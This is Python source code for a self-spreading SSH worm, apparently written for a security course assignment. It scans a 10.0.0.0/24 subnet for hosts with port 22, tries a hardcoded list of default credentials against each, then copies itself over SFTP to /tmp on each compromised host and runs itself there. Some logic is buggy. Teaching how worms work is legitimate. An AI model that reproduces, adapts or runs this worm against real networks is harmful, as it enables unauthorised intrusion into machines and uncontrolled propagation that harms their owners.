import os
import sys

import paramiko
import nmap
import netinfo
import netifaces
import socket, fcntl, struct


# The list of credentials to attempt
credList = [
('root', 'toor'),
('admin', '#NetSec!#'),
('osboxes', 'osboxes.org'),
('cpsc', 'cpsc')
]

# The file marking whether the worm should spread
INFECTED_MARKER_FILE = "/tmp/infected.txt"

##################################################################
# Returns whether the worm should spread
# @return - True if the infection succeeded and false otherwise
##################################################################
def isInfectedSystem():

    # Check if the system as infected. One
	# approach is to check for a file called
	# infected.txt in directory /tmp (which
	# you created when you marked the system
	# as infected).
    global INFECTED_MARKER_FILE
    return os.path.exists(INFECTED_MARKER_FILE)

#################################################################
# Marks the system as infected
#################################################################
def markInfected():

    # Mark the system as infected. One way to do
	# this is to create a file called infected.txt
	# in directory /tmp/
    global INFECTED_MARKER_FILE
    fopen = open(INFECTED_MARKER_FILE, "w")
    fopen.close()
    pass

###############################################################
# Spread to the other system and execute
# @param sshClient - the instance of the SSH client connected
# to the victim system
###############################################################
def spreadAndExecute(sshClient):

    # This function takes as a parameter 
	# an instance of the SSH class which
	# was properly initialized and connected
	# to the victim system. The worm will
	# copy itself to remote system, change
	# its permissions to executable, and
	# execute itself. Please check out the
	# code we used for an in-class exercise.
	# The code which goes into this function
	# is very similar to that code.	
    sftpClient = sshClient.open_sftp()
    sftpClient.put("/tmp/worm.py", "/tmp/worm.py")
    sshClient.exec_command("python /tmp/worm.py)")
    pass


############################################################
# Try to connect to the given host given the existing
# credentials
# @param host - the host system domain or IP
# @param userName - the user name
# @param password - the password
# @param sshClient - the SSH client
# return - 0 = success, 1 = probably wrong credentials, and
# 3 = probably the server is down or is not running SSH
###########################################################
def tryCredentials(host, userName, password, sshClient):

    # Tries to connect to host host using
	# the username stored in variable userName
	# and password stored in variable password
	# and instance of SSH class sshClient.
	# If the server is down or has some other
	# problem, connect() function which you will
	# be using will throw socket.error exception.	     
	# Otherwise, if the credentials are not
	# correct, it will throw 
	# paramiko.SSHException exception. 
	# Otherwise, it opens a connection
	# to the victim system; sshClient now 
	# represents an SSH connection to the 
	# victim. Most of the code here will
	# be almost identical to what we did
	# during class exercise. Please make
	# sure you return the values as specified
	# in the comments above the function
	# declaration (if you choose to use
	# this skeleton).
    try:
        sshClient.connect(host, userName, password)
    except socket.error:
        print("Error: Host is unreachable.")
        exit(3)
    except paramiko.SSHException:
        print("Error: Incorrect credentials. Failed to establish SSH connection.")
        exit(1)

    return 0

###############################################################
# Wages a dictionary attack against the host
# @param host - the host to attack
# @return - the instace of the SSH paramiko class and the
# credentials that work in a tuple (ssh, username, password).
# If the attack failed, returns a NULL
###############################################################
def attackSystem(host):

    # The credential list
    global credList

    # Create an instance of the SSH client
    ssh = paramiko.SSHClient()

    # Set some parameters to make things easier.
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    # The results of an attempt
    attemptResults = None

    # Go through the credentials
    for (username, password) in credList:

        # TODO: here you will need to
		# call the tryCredentials function
		# to try to connect to the
		# remote system using the above 
		# credentials.  If tryCredentials
		# returns 0 then we know we have
		# successfully compromised the
		# victim. In this case we will
		# return a tuple containing an
		# instance of the SSH connection
		# to the remote system.
        if tryCredentials(host, username, password, ssh) == 0:
            return (ssh, username, password)

    # Could not find working credentials
    return None

####################################################
# Returns the IP of the current system
# @param interface - the interface whose IP we would
# like to know
# @return - The IP address of the current system
####################################################
def getMyIP():

    # TODO: Change this to retrieve and
	# return the IP of the current system.

	# Get all the network interfaces on the system
    networkInterfaces = netifaces.interfaces()

    # The IP address
    ipAddr = None

    # Go through all the interfaces
    for netFace in networkInterfaces:

        # The IP address of the interface
        addr = netifaces.ifaddresses(netFace)[2][0]['addr']

        # Get the IP address
        if not addr == "127.0.0.1":

            # Save the IP addrss and break
            ipAddr = addr
            break

    return ipAddr

#######################################################
# Returns the list of systems on the same network
# @return - a list of IP addresses on the same network
#######################################################
def getHostsOnTheSameNetwork():

	# TODO: Add code for scanning
	# for hosts on the same network
	# and return the list of discovered
	# IP addresses.

	# Create an instance of the port scanner class
    portScanner = nmap.PortScanner()

    # Scan the network for systems whose
	# port 22 is open (that is, there is possibly
	# SSH running there).
	#portScanner.scan('10.0.0.0/24', arguments='-p 22 --open')
    portScanner.scan('10.0.0.0/24', arguments='-p 22')
    # Scan the network for hosts
    hostInfo = portScanner.all_hosts()

    # The list of hosts that are up.
    liveHosts = []

    # Go through all the hosts returned by nmap
	# and remove all who are not up and running
    for host in hostInfo:

        # Is ths host up?
        if portScanner[host].state() == "up":
            liveHosts.append(host)

    return liveHosts

# If we are being run without a command line parameters, 
# then we assume we are executing on a victim system and
# will act maliciously. This way, when you initially run the 
# worm on the origin system, you can simply give it some command
# line parameters so the worm knows not to act maliciously
# on attackers system. If you do not like this approach,
# an alternative approach is to hardcode the origin system's
# IP address and have the worm check the IP of the current
# system against the hardcoded IP. 
def main():

    # TODO: If we are running on the victim, check if 
	# the victim was already infected. If so, terminate.
	# Otherwise, proceed with malice.
    if len(sys.argv) < 2:
        if isInfectedSystem() == True:
            exit(0)
        pass

    # TODO: Get the IP of the current system
    myIP = getMyIP()
    # Get the hosts on the same network
    networkHosts = getHostsOnTheSameNetwork()

    # TODO: Remove the IP of the current system
    # from the list of discovered systems (we
    # do not want to target ourselves!).
    try:
        networkHosts.remove(myIP)
    except ValueError:
        pass

    print("Found hosts: {}".format(networkHosts))

    # Go through the network hosts
    for host in networkHosts:

        # Try to attack this host
        sshInfo = attackSystem(host)

        print(sshInfo)


        # Did the attack succeed?
        if sshInfo:

            print("Trying to spread")

            # Infect that system
            spreadAndExecute(sshInfo[0])

            print("Spreading complete")
 
main()